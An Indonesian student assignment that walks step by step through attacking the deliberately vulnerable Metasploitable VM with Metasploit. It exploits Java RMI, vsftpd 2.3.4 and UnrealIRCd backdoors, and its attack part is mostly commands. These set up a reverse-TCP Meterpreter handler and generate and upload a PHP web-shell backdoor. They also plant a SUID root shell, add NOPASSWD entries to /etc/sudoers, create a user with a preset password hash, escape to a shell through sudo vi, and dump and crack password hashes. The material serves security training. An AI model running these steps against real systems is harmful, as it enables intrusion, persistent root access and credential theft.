# Tugas 5

## Pendahuluan

&nbsp;&nbsp;&nbsp; Komputer sebagai perangkat yang sering digunakan untuk memudahkan pekerjaan manusia di berbagai bidang membuat perangkat ini dimiliki oleh setiap orang. Sistem operasi yang mengendalikan dan mengkoordinasikan semua perangkat keras yang bekerja di komputer menjadikan munculnya berbagai tipe sistem operasi yang berkembang di pasaran, dimulai dari sistem operasi yang berbayar seperti Windows hingga yang gratis atau open source seperti Linux.

&nbsp;&nbsp;&nbsp; Sistem operasi yang berkembang saat ini selalu mengalami pembaharuan untuk meningkatkan kinerja serta kualitas yang dimilikinya. Perkembangan sistem operasi sekarang ini banyak mengalami penyempurnaan akan tetapi masih terdapat celah keamanan yang dapat dieksploitasi dengan berbagai cara yang mengakibatkan komputer dapat dieksploitasi dan dimanfaatkan oleh orang yang tidak memiliki hak akses ke dalam sebuah sistem.

&nbsp;&nbsp;&nbsp; Untuk mengetahui celah keamanan tersebut perlu adanya pengujian atau penetrasi untuk menguji dan mencari celah keamanan apa saja yang dapat dieksploitasi di sistem operasi yang dapat digunakan untuk masuk ke dalam sebuah sistem tanpa memiliki hak akses.

## Dasar Teori

### Metasploitable
&nbsp;&nbsp;&nbsp; Metasploitable adalah mesin secara sengaja rentan virtual Linux. VM ini dapat digunakan untuk melakukan pelatihan keamanan, alat tes keamanan, dan praktek penetrasi Versi pengujian umum teknik ini 2 dari mesin virtual yang tersedia untuk di-download dari Sourceforge dan kapal dengan kerentanan bahkan lebih dari gambar asli.

### Kali Linux
&nbsp;&nbsp;&nbsp; Kali Linux merupakan pembangunan kembali BackTrack Linux secara sempurna,  mengikuti sepenuhnya kepada standar pengembangan Debian. Semua infrastruktur baru telah dimasukkan ke dalam satu tempat, semua tools telah direview dan dikemas, dan kami menggunakan Git untuk VCS nya.

## Instalasi

### -Instalasi Metasploitable pada Virtual Box



1. Download dan install Virtual Box pada komputer anda.
2. Setelah instalasi selesai, buka Virtual Box dan klik "New".

![alt text](https://scontent-sit4-1.xx.fbcdn.net/v/t34.0-12/15356755_1380978318593630_3194431754367144286_n.jpg?oh=f087713c84352ad23b6478a8493fe365&oe=5849DC89 "")

3. Anda bisa memberikan nama, tujuannya kita memberi nama pada Metasploitable hanya untuk memastikan nama itu dimengerti dan mudah untuk dikenali.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;![alt text](https://scontent-sit4-1.xx.fbcdn.net/v/t34.0-12/15380732_1380971348594327_7514329790307194132_n.jpg?oh=0246f9be1fd2c43b4417052ac6bc505e&oe=5848BEE2 "")

4. Untuk memori, anda setidaknya mengalokasikan memori minimal 256MB. Namun jika anda mempunyai RAM yang cukup besar, anda bisa meninambahkan alokasi memorinya. 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;![alt text](https://scontent-sit4-1.xx.fbcdn.net/v/t34.0-12/15319080_1380971545260974_1520687697596227853_n.jpg?oh=d64003d28cba89fdba1374e5ff8c275a&oe=5848FFEB "")

5. Di dalam jendela "Create Virtual Machine", anda dapat memilih lokasi gambar yang telah anda download sebelumnya (setelah mengekstrak file ZIP nya). Klik logo folder di sebelah kanan bawah dan cari lokasi gambar Metasploitable.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;![alt text](https://scontent-sit4-1.xx.fbcdn.net/v/t34.0-12/15327502_1380972465260882_5014155796298159778_n.jpg?oh=0402f6e77f2519d2f1f2d58683729e8f&oe=5848C3B3 "")

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ketika selesai, klik "Create"

6. Langkah selanjutnya adalah kita harus menjalankan machine yang baru saja kita install. Pilih Metasploitable OS dan klik "Start".
7. Machine metasploitable akan booting dan seperti ini tampilan window nya.

![alt text](https://scontent-sit4-1.xx.fbcdn.net/v/t34.0-12/15284855_1380970998594362_1369452897915757503_n.jpg?oh=3f4082ecf41161618c6ca0aa1782a7c3&oe=5848F2DA "")

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Secara default usernamenya: msfadmin dan passwordnya: msfadmin. Anda bisa merubah &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;username dan password setelah log in dan menjadikan root.  

## Uji Penetrasi Metasploit

### Exploit Java RMI Server

#### Scan Target dengan NMAP
1. Jalankan Intense NMAP Scan pada VM Metasploitable
Pada terminal masukkan`nmap -p 1-65535 -T4 -A -v 192.168.56.102 2>&1 | tee /var/tmp/scan.txt`
`192.168.56.102` adalah IP dari VM Metasoplitable
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20nmap.png "NMAP")

Untuk melihat hasil nmap. Pergi ke /var/tmp. Pada terminal masukkan
`cd /var/tmp`
`grep -i rmi scan.txt`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20nmap%20grep.png "NMAP grep")

#### Jalankan Exploit pada RMI Registry Server
2. Buka msfconsole
Pada terminal masukkan:
`script msfconsole_rmi.txt`
`msfconsole`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20msfconsole.png "msfconsole")
`script` digunakan untuk membuat typescript yang menyimpan semua output terminal pada file (msfconsole_rmi.txt).

3. Jalankan Java RMI Server Exploit
Pada terminal masukkan:
`search java_rmi`
`use exploit/multi/misc/java_rmi_server`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi.png "msfconsole Java RMI")

4. Set RHOST
Pada terminal masukkan:
`show options`
`set RHOST 192.168.56.102`
Untuk mengecek RHOST masukkan `show options`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20rhost.png "msfconsole Java RMI RHOST")
`192.168.56.102` adalah IP Metasploitable.

5. Exploit
Pada terminal masukkan `exploit` untuk menjalankan exploit Java RMI pada Metasplotable
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit.png "msfconsole Java RMI exploit")

6. Cek Root
Untuk mengecek apakah kita mendapat akses root, pada terminal masukkkan:
`ipconfig`
`getuid`
`sysinfo`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20got%20root.png "msfconsole Java RMI got root")

#### Membuat Backdoors dan Session yang Lain

7. Background Session
Untuk menyimpan session masukkan `background`, lalu untuk melihat session masukkan `sessions -l`.
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20background.png "msfconsole background")

8. Multi Handler dan Payload
Masukkan config untuk multi handler dan paylod.
`use exploit/multi/handler`
`set PAYLOAD php/meterpreter/reverse_tcp`
`show options`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20multi.png "msfconsole multi")

9. Set Listening Host dan Port Multi Handler
Masukkan IP dari host:
`ifconfig`
`set LHOST 192.168.56.101`
`set LPORT 1099`
`set ExitOnSession false`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20multi%20set.png "msfconsole multi set")

10. Background Job
Jalankan handler sebagai handler job. Masukkan:
`exploit -j`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20background%20job.png "msfconsole handler job")

11. Set PHP Backdoor
Untuk memuat backdoor PHP, masukkan:
`use payload/php/meterpreter/reverse_tcp`
`show options`
`set LHOST 192.168.1.111`
`set LPORT 1099`
`show options`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20php%20backdoor.png "msfconsole php backdoor")

12. Generate PHP Backdoor
Untuk men-generate backdoor, masukkan:
`generate -t raw -f backdoor.php`
`pwd`
`ls -l backdoor.php`
`head -2 backdoor.php`
`tail -2 backdoor.php`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20background%20job%20php.png "msfconsole generate backdoor")

13. Enable PHP Backdoor
Hapus tag comment pada backdoor, masukkan:
`sed -i 's:*<?php:<?php:' backdoor.php`
`sed -i 's:/<?php:<?php:' backdoor.php`
`head -1 backdoor.php`
`echo "?>" >> backdoor.php`
`tail -3 backdoor.php`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20php%20backdoor%20sed.png "msfconsole generate backdoor sed")

14. Masuk ke java_rmi Meterpreter Session
Untuk masuk ke Session java RMI, masukkan:
`sessions -l`
`sessions -i 1`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter.png "msfconsole meterptreter")

15. Basic Web Server Interrogation
Untuk membuat shell, masukkan:
`shell`
`ps -eaf | egrep '(http|apache)' | grep -v grep`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20web%20interro.png "msfconsole meterptreter web interro")
Dapat dilihat bahwa terdapat Apache2 sebagai Web Server.

16. Mendapatkan Apache Root Directory
`ls -l /etc | grep release`
`cat /etc/lsb-release` digunakan untuk melihat jenis Linux
`cd /var/www`
`ls -l`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20locate%20apache%20root.png "msfconsole meterptreter locate apache root")

17. Membuat Backdoor SUID
`which sh` untuk mencari path dari shell
`cp `which sh` .backdoor` copy file command interpreter shell
`ls -l .backdoor`
`chmod 4777 .backdoor` agar user dari www-data dapat mengakses root
`ls -l .backdoor`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20suid%20backdoor.png "msfconsole meterptreter suid backdoor")

18. Membuat Backdoor SUDO
`ps -eaf | grep apache2`
`ls -l /etc/sudoers`
`echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers` agar kita tidak perlu memasukkan password ketika melakukan perintah sudo
`grep "www-data" /etc/sudoers`
`exit`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20sudo%20backdoor.png "msfconsole meterptreter sudo backdoor")

19. Upload Backdoor PHP
Untuk mengupload backdoor php, masukkan:
`pwd`
`cd /var/www`
`upload backdoor.php .`
`ls`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20meterpreter%20upload%20php%20backdoor.png "msfconsole meterptreter upload php backdoor")

#### Membuat Session Kedua

20. Aktifkan PHP Backdoor
Pada msfconsole masukkan:
`background`
Setelah itu buka browser dan akses backdoor di `http://192.168.56.102/backsdoor.php`
Lalu lihat session yang terbuka: `sessions -l`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20active%20sessions.png "msfconsole active session")

21. Interaksi dengan PHP Session
`sessions -l`
`sessions -i 3` digunakan untuk mengakses php session (id 3)
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20interact%20php%20sessions.png "msfconsole interact php session")

#### Implementasi Backdoor SUID
22. Mendapatkan root dari SUID
Pada meterpreter masukkan:
`shell`
`pwd`
`./.backdoor`
`id`
`./.backdoor -p`
`id`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20suid%20backdoor%20implement.png "meterpreter suid imple")

23. Membuat User dan Menambahkannya ke grup SUDOERS
`/usr/sbin/useradd -m -d /home/burung -c "Burung" -s /bin/bash burung`
`grep hackingdo /etc/passwd`
`grep hackingdo /etc/shadow`
`sed -i 's/:!:/:$1$e4y.VI4o$ZT1dIDHhNMtaGS2xKAaQ90:/' /etc/shadow password = abc123`
`grep burung /etc/shadow`
`echo "burung ALL=NOPASSWD: ALL" >> /etc/sudoers`
`grep "burung" /etc/sudoers`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20meterpreter%20create%20user.png
 "meterpreter suid imple create user")
 
24. Mengetes Backdoor SUID
`exit` untuk keluar dari privileged shell
`exit` untuk keluar dari non-privileged shell
`exit` untuk keluar dari shell
`exit` untuk keluar dari session meterpreter PHP
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20testing%20suid%20backdoor.png
 "meterpreter suid imple testing")

#### Implementasi Backdoor Sudo #1

25. Menghubungkan Kembali PHP Meterpreter Session dengan SUDO Exploit #1
Pada msfconsole masukkan:
`sessions -l`
Setelah itu buka browser dan akses backdoor di `http://192.168.56.102/backsdoor.php`
Lalu lihat session yang terbuka: `sessions -l`
`sessions -i 5` digunakan untuk mengakses session php (id 5)
Setelah itu pada meterpreter masukkan:
`shell`
`id`
`sudo su -`
`id`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20sudo%20backdoor%20implement.png
 "meterpreter sudo imple")

26. Keluar dari meterpreter
`id`
`exit` keluar dari `sudo su`
`id`
`exit` keluar dari shell
`exit` keluar dari PHP session
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20sudo%20backdoor%20implement%20exit.png
 "meterpreter sudo imple exit")


#### Menggunakan SUDO VI Exploit
27. Menghubungkan Kembali PHP Meterpreter Session
Pada msfconsole masukkan:
`sessions -l`
Setelah itu buka browser dan akses backdoor di `http://192.168.56.102/backsdoor.php`
Lalu lihat session yang terbuka: `sessions -l`
`sessions -i 6` digunakan untuk mengakses session php (id 6)
Setelah itu pada meterpreter masukkan:
`shell`
`id`
`sudo vi t.txt 2>/dev/null`
`Tekan <Enter>`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20suid%20implement%20vi.png
 "meterpreter vi imple")
 
28. VI SUDO Exploit
Pada vim, masukkan:
`:!/bin/sh`
`Tekan <Enter>`
`Tekan <Enter>`
`id`
`exit`
`Tekan <Enter>`
`:q!`
`Tekan <Enter>`
`id`
`exit`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20suid%20backdoor%20implement%20exit.png "meterpreter vi imple exit")
 
#### Mengumpulkan Forensics Capture
29. Menghubungkan Kembali PHP Meterpreter Session
Sama seperti langkah 27. Hubungkan kembali PHP Session

30. Membuat Direktori Forensik
Pada terminal masukkan:
`ssh burung@192.168.56.102`
`password: abc123`
`sudo su -`
`mkdir -p /var/www/rmi`
`chown www-data:www-data /var/www/rmi`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20forensic%20dir.png "forensic dir")

31. Membuat Lime Memory Dump dan Capture Basic Forensics Artifacts
`cd /var/tmp/src`
`insmod ./lime-2.6.24-16-server.ko "path=/var/www/rmi/rmi.lime format=lime"`
`netstat -nao > /var/www/rmi/rmi.netstat.txt`
`lsof > /var/www/rmi/rmi.lsof.txt`
`ps -eaf > /var/www/rmi/rmi.pseaf.txt`
`ls -l /var/www/rmi/`
`exit`
`exit`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20forensic.png "forensic")

32. Mengambil Basic Forensics Artifacts
`mkdir -p /forensics`
`cd /forensics`
`wget -r -nH -np -R index.html* "http://192.168.1.106/rmi/"`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20forensic%20collect.png "forensic collect")

33. Keluar Meterpreter, msfconsole dan script
Pada msfconsole masukkan:
`exit -y`
`exit -y`
`exit`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exit%20msfconsole.png "exit msfconsole")

34. Proof of Lab
Pada terminal masukkan:
`grep "meterpreter" msfconsole_rmi.txt | egrep '(4444|1099)' | sort | uniq`
`grep "ESTABLISHED" /forensics/rmi/rmi.netstat.txt`
`grep "metasploit" /forensics/rmi/rmi.pseaf.txt`
`date`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20proof.png "proof")

### Exploit vsftpd_234_backdoor

1. Masuk ke metasploit console dengan cara mengetikkan perintah: `msfconsole`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_1.PNG "")

2. Setelah masuk ke metasploit console, kita akan mencari exploitnya dengan mengetikkan perintah: `search vsftpd`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_2.PNG "")

3. Setelah mendapatkan yang kita cari, kemudian kita masuk kedalamnya dengan mengetikkan perintah: `use exploit/unix/ftpvsftpd_234_backdoor` dan jangan lupa untuk setting ip target yang akan di exploit dengan mengetikkan perintah: `set RHOST [IP_Target]`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_3.PNG "")

4. Kita akan melakukan exploit. Ketikkan perintah: `exploit`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_4.PNG "")

5. Lihat session yang sedang berjalan dengan perintah: `sessions -l`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_5.PNG "")

6. Kemudian kita akan melihat post apa saja yang tersedia dengan mengetikkan perintah: `show post`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_6.PNG "")

7. Misalnya disini saya akan melakukan exploit terhadap hashdump. Kita ketikkan perintah: `use post/linux/gather/hashdump`. Kemudian set session yang sedang berjalan dengan perintah: `set session 1`. Untuk eksekusi ketikkan perintah: `run`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_7.PNG "")

8. Saat kita mengecek file dump tersebut, isi filenya masih terenkripsi. Oleh karena itu kita akan mendecrypt dengan bantuan tool lain, yaitu John de Ripper. Untuk menjalankan tool tersebut kita akan masuk ke direktori `/usr/sbin`, kemudian jalankan John de Ripper dengan mengetikkan perintah: `./john [Lokasi_File_Hashdump]`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/vsftpd_8.PNG "")

9. Dari gambar di atas, setelah file dump berhasil di decrypt kita dapat melihat username dan password target kita

### Exploit unreal_ircd_3281_backdoor

1. Sama dengan exploit sebelumnya, pertama kita masuk ke metasploit console dengan cara mengetikkan perintah: `msfconsole`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_1.PNG "")

2. Setelah masuk ke metasploit console, kita akan mencari exploitnya dengan mengetikkan perintah: `search unreal`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_2.PNG "")

3. Setelah mendapatkan yang kita cari, kemudian kita masuk kedalamnya dengan mengetikkan perintah: `use exploit/unix/irc/unreal_ircd_3281_backdoor` dan jangan lupa untuk setting ip target yang akan di exploit dengan mengetikkan perintah: `set RHOST [IP_Target]`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_3.PNG "")

4. Kita akan melakukan exploit. Ketikkan perintah: `exploit -z`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_4.PNG "")

5. Lihat session yang sedang berjalan dengan perintah: `sessions -l`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_5.PNG "")

6. Kemudian kita akan melihat post apa saja yang tersedia dengan mengetikkan perintah: `show post`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_6.PNG "")

7. Seperti exploit sebelumnya, disini saya kembali akan melakukan exploit terhadap hashdump. Kita ketikkan perintah: `use post/linux/gather/hashdump`. Kemudian set session yang sedang berjalan dengan perintah: `set session 1`. Untuk eksekusi ketikkan perintah: `run`
![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/ircd_7.PNG "")

8. Sama seperti sebelumnya, kita akan melakukan decrypt dengan bantuan tool John de Ripper untuk mendapatkan username dan password target dengan cara mengetikkan perintah: `./john [Lokasi_File_Hashdump]`.
